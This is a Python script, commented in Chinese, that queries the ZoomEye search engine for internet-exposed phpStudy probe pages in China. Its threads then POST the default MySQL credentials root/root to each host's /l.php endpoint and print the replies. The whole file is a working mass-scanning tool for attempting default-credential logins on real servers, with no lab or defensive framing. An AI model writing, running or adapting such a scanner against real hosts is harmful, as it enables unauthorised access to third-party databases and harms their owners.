from zoomeye.sdk import ZoomEye
from queue import Queue
import threading
import requests


class Crawl_thread(threading.Thread):
    '''
       抓取线程类，注意需要继承线程类Thread
    '''

    def __init__(self, thread_id, queue):
        threading.Thread.__init__(self)  # 需要对父类的构造函数进行初始化
        self.thread_id = thread_id
        self.queue = queue  # 任务队列

    def run(self):
        '''
        线程在调用过程中就会调用对应的run方法
        :return:
        '''
        print('启动线程：', self.thread_id)
        self.crawl_spider()
        print('退出了该线程：', self.thread_id)

    def crawl_spider(self):
        zm = ZoomEye()
        zm.username = ''
        zm.password = ''
        zm.login()
        while True:
            if self.queue.empty():  # 如果队列为空，则跳出
                break
            else:
                page = self.queue.get()
                print('当前工作的线程为：', self.thread_id, " 正在采集：", page)
                try:
                    data = zm.dork_search('phpStudy探针 +country:"CN"', page)
                    for ip in zm.dork_filter("ip,port"):
                        data_queue.put(str(ip[0]) + ':' + str(ip[1]))  # 将采集的结果放入data_queue中
                except Exception as e:
                    print('采集线程错误', e)


class Parser_thread(threading.Thread):
    def __init__(self, thread_id, queue, file):
        threading.Thread.__init__(self)
        self.thread_id = thread_id
        self.queue = queue
        self.file = file

    def run(self):
        print('启动线程：', self.thread_id)
        while not flag:
            try:
                item = self.queue.get(False)  # get参数为false时队列为空，会抛出异常
                if not item:
                    pass
                self.parse_data(item)
                self.queue.task_done()  # 每当发出一次get操作，就会提示是否堵塞
            except Exception as e:
                pass

    def parse_data(self, item):
        '''
                解析网页内容的函数
                :param item:
                :return:
                '''
        # 发起 post 请求
        url = 'http://' + item + '/l.php'
        data = {
            'host': 'localhost',
            'port': '3306',
            'login': 'root',
            'password': 'root',
            'act': 'MySQL检测',
            'funName': ''
        }
        headers = {
            'Content-Type': 'application/x-www-form-urlencoded',
            'Host': item,
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36'
        }
        res = requests.post(url=url,data=data,
                            headers=headers)
        print(res.text)
        print('退出了该线程：', self.thread_id)


data_queue = Queue()  # 存放解析数据的queue
flag = False


def main():
    output = open('scan.json', 'a', encoding='utf-8')  # 将结果保存到一个json文件中
    pageQueue = Queue(50)  # 任务队列，存放网页的队列
    for page in range(1, 2):
        pageQueue.put(page)  # 构造任务队列

    # 初始化采集线程
    crawl_threads = []
    crawl_name_list = ['crawl_1', 'crawl_2', 'crawl_3']  # 总共构造3个爬虫线程
    for thread_id in crawl_name_list:
        thread = Crawl_thread(thread_id, pageQueue)  # 启动爬虫线程
        thread.start()  # 启动线程
        crawl_threads.append(thread)

    # 初始化解析线程
    parse_thread = []
    parser_name_list = ['parse_1', 'parse_2', 'parse_3']
    for thread_id in parser_name_list:  #
        thread = Parser_thread(thread_id, data_queue, output)
        thread.start()  # 启动线程
        parse_thread.append(thread)

    # 等待队列情况，先进行网页的抓取
    while not pageQueue.empty():  # 判断是否为空
        pass  # 不为空，则继续阻塞

    # 等待所有线程结束
    for t in crawl_threads:
        t.join()

    # 等待队列情况，对采集的页面队列中的页面进行解析，等待所有页面解析完成
    while not data_queue.empty():
        pass
    # 通知线程退出
    global flag
    flag = True
    for t in parse_thread:
        t.join()  # 等待所有线程执行到此处再继续往下执行

    print('退出主线程')
    output.close()


if __name__ == '__main__':
    main()
